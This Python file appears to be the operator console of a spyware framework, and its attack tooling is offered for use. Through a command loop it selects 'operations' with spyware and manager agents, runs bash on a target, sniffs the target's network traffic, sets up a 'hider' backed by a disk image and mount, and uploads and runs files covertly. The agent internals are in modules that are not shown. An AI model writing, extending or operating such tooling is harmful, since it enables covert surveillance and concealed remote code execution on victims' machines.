"""
from connection import Connection
from listener import Listener
from command import Command
from responce import Responce
from status import Status
from icecream import ic
"""
from agent import Agent
from operation import Operation
from contParams import *
from funCode import FunCode


# class Agent():
#     def __init__(self, x):
#         self.x = x

#     def f(self, s):
#         print(f'f {self.x}: {s}')

# class Operation():
#     def __init__(self, s):
#         self.spyAgent = Agent(s)
#         self.managerAgent = Agent(s)

def LOG(s: str):
    print(f'LOG: {s}')

class Context:
    def __init__(self, operations):
        self.selected_operation: Operation = None
        self.oper_dict = operations
        self.cont_ident = 0

# if you want to pass argument with multiple words use "word1 word2 ..."
def parse_args(args: str):
    args = args.split()
    parsed = []
    quoted = []

    in_quotes = False
    for arg in args:
        if arg[0] == '"' and arg[-1] == '"':
            parsed.append(arg[1:-1])
        elif arg[0] == '"':
            in_quotes = True
            quoted = [arg[1:]]
        elif in_quotes:
            if arg[-1] == '"':
                quoted.append(arg[:-1])
                parsed.append(' '.join(quoted))
                in_quotes = False
            else:
                quoted.append(arg)
        else:
            parsed.append(arg)
    print(f"DB: {parsed=}")
    return parsed


def call_method_raw(obj, args: str):
    args = args.split(None, 1)
    if len(args) == 1:
        call_method(obj, args[0])
    else:
        call_method(obj, args[0], *parse_args(args[1]))

def call_method(obj, method: str, *args):
    if hasattr(obj, method):
        try:
            return getattr(obj, method)(*args)
        except Exception as e:
            print("OOPSIE: probably wrong arguments")
            print(e)
    else:
        print(f"OOPSIE: Method {method} not found")


def print_methods(obj):
        attributes = dir(obj)
        methods = [attr for attr in attributes if callable(getattr(obj, attr)) and not attr.startswith("__")]
        print("YAY: Available Methods: (q for exit)")
        print(methods)

class UI:
    def __init__(self, operations: dict[str, Operation]) -> None:
        self.ctx = Context(operations)

    def is_op_active(self) -> bool:
        if not self.ctx.selected_operation:
            print("OOPSIE: Unselected operation")
            return False
        return True

    def select(self, name: str):
        if name not in self.ctx.oper_dict.keys():
            print("OOPSIE: Contraption not found")
        self.ctx.selected_operation = self.ctx.oper_dict[name]
        LOG(f"Selected {name}")

    def spyware(self, method, *args):
        if self.is_op_active():
            return call_method(self.ctx.selected_operation.spyAgent, method, *args)

    def manager(self, method, *args):
        if self.is_op_active():
            return call_method(self.ctx.selected_operation.managerAgent, method, *args)

    # list operations
    def ops(self):
        print("YAY: Available operations:")
        for op_name in self.ctx.oper_dict.keys():
            if (self.ctx.selected_operation == self.ctx.oper_dict[op_name]):
                print("-> ", end='')
            else:
                print('   ', end='')
            print(f"{op_name}")

    def rename(self, old_name, new_name):
        if old_name not in self.ctx.oper_dict.keys():
            print("OOPSIE: Operation not found")
            return
        if new_name in self.ctx.oper_dict.keys():
            print("OOPSIE: new name exists")
            return
        self.ctx.oper_dict[new_name] = self.ctx.oper_dict.pop(old_name)

    # list agent operations
    def agentops(self):
        print_methods(Agent(0))

    def help(self):
        print_methods(self)

    def bash(self, cmd: str):
        if not self.is_op_active():
            return
        res = self.manager('run_bash', cmd)
        print(f"DB: {res=}")
        return res[1]

    def opstat(self):
        if not self.is_op_active():
            return
        if self.ctx.selected_operation.managerAgent:
            print("YAY: Manager agent exists")
        if self.ctx.selected_operation.spyAgent:
            print("YAY: Spyware agent exists")
        else:
            print("MEH: No spyware")
        if self.ctx.selected_operation.netDriver:
            print(f"YAY: NetDriver: {self.ctx.selected_operation.netDriver}")

    def findNet(self):
        nets = self.bash('ls /sys/class/net').split('\n')
        for net in nets:
            if net != 'lo':
                self.ctx.selected_operation.netDriver = net
                LOG(f'Set {net=}')
                return True
        print("OOPSIE: Could not find non localhost network device")
        return False

    def sniff(self, time):
        time = int(time)
        if not self.is_op_active():
            return
        if not self.ctx.selected_operation.netDriver:
            print("MEH: Trying to find out network driver")
            if not self.findNet():
                return
        net_driver = self.ctx.selected_operation.netDriver
        params = ContParams(SnifferType, Params(SniffParams(time, net_driver.encode())))
        print(self.ctx.selected_operation.spyAgent.runContraption(params, self.ctx.cont_ident))
        self.ctx.cont_ident += 1


    def setup(self, targetPath, imagePath, mountPath):
        if not self.is_op_active():
            return    
        try:
            self.ctx.selected_operation.managerAgent.hider_setup(targetPath, imagePath, mountPath)
            LOG(f'Setup Manager hider')
            self.ctx.selected_operation.spyAgent.hider_setup(targetPath, imagePath, mountPath)
            LOG(f'Setup Spyware hider')
        except Exception as e:
            print(f"DB: {e=}") # first trying to setup spyware hider will fail because no spyware

    def check_ready(self):
        if not self.is_op_active():
            return False
        if not self.ctx.selected_operation.managerAgent.is_hider_active:
            print("OOPSIE: setup hider needed")
            return False
        return True

    def uprun(self, homePath, targetPath):
        if self.check_ready():
            self.ctx.selected_operation.managerAgent.hidden_action_with_upload(
                FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
                homePath,
                targetPath,
            )

    def upload(self, homePath, targetPath):
        if self.check_ready():
            self.ctx.selected_operation.managerAgent.hidden_action_with_upload(
                FunCode.HIDDEN_UPLOAD,
                homePath,
                targetPath,
            )

        
if __name__ == "__main__":
    operations = {'mat': Operation('m'), 'buja': Operation('b')}
    ui = UI(operations)
    ui.help()

    value = input('$ ')
    while value != 'q':
        args = value.split()
        call_method(ui, args[0], *args[1:])
        value = input('$ ')
